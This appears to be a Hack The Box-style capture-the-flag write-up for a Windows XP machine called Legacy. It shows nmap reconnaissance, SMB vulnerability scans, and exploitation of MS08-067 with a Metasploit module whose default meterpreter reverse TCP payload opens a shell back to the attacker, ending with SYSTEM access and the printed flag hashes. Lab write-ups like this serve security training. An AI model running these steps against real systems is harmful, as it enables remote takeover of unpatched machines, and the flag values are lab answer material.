### Summary
We're given access to an old Windows XP machine with a vulnerable instance of `SMBv1` running. The machine is `x86` meaning `Eternal Blue` doesn't apply here, but we also have `ECLIPSEDWING` (CVE-2008-4250). 

### Tools
- `nmap` - vulnerability scripts
- `metasploit`

###### [[#Recon]]
- [[#Initial Scan]]
- [[#SMB - TCP 445]]
###### [[#Root Shell]]
- [[#ECLIPSEDWING (CVE-2008-4250)]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 10.129.227.181 -vv -oN nmap/tcp            
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```
```sh
❯ sudo nmap -p 135,139,445 -sCV 10.129.227.181 -vv -oN nmap/tcpScripts
PORT    STATE SERVICE      REASON          VERSION
135/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack ttl 127 Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-security-mode: Couldn\'t establish a SMBv2 connection.
|_clock-skew: mean: 5d00h56m51s, deviation: 1h24m50s, median: 4d23h56m51s
|_smb2-time: Protocol negotiation failed (SMB2)
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:50:30 (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   00 50 56 b0 50 30 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 32549/tcp): CLEAN (Couldn\'t connect)
|   Check 2 (port 16915/tcp): CLEAN (Couldn\'t connect)
|   Check 3 (port 56786/udp): CLEAN (Failed to receive data)
|   Check 4 (port 60321/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-02-10T03:31:46+02:00
```

- We can see that the host is Windows XP, very outdated
- Old versions of `SMB` are rife with juicy vulnerabilities

## SMB - TCP 445
---
- We can use `nmap` scripts to inspect for `SMB` vulnerabilities
- `nmap` scripts are located in `/usr/share/nmap/scripts`
```sh
❯ ls /usr/share/nmap/scripts | grep smb | grep vuln
smb2-vuln-uptime.nse
smb-vuln-conficker.nse
smb-vuln-cve2009-3103.nse
smb-vuln-cve-2017-7494.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-ms17-010.nse
smb-vuln-regsvc-dos.nse
smb-vuln-webexec.nse
```

- We can run the following commands to test for smb vulnerabilities on the target:
```sh
❯ nmap --script 'smb*vuln*' -p 445 10.129.227.181 -vv -oN nmap/smbEnum
PORT    STATE SERVICE      REASON
445/tcp open  microsoft-ds syn-ack

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
```
- Looks like our host is vulnerable to `CVE-2017-0143`
	- Unfortunately, this is only exploited with `x64` while our target machine is `x86`

# Root Shell
##  ECLIPSEDWING (CVE-2008-4250)
---
- We can use `Metasploit` to perform this exploitation for us:
```sh
msf exploit(windows/smb/ms17_010_eternalblue) > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.129.227.181
RHOSTS => 10.129.227.181                            
msf exploit(windows/smb/ms08_067_netapi) > set LHOST tun0
LHOST => 10.10.15.161                               
msf exploit(windows/smb/ms08_067_netapi) > set LPORT 12345
LPORT => 12345
run

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f
```





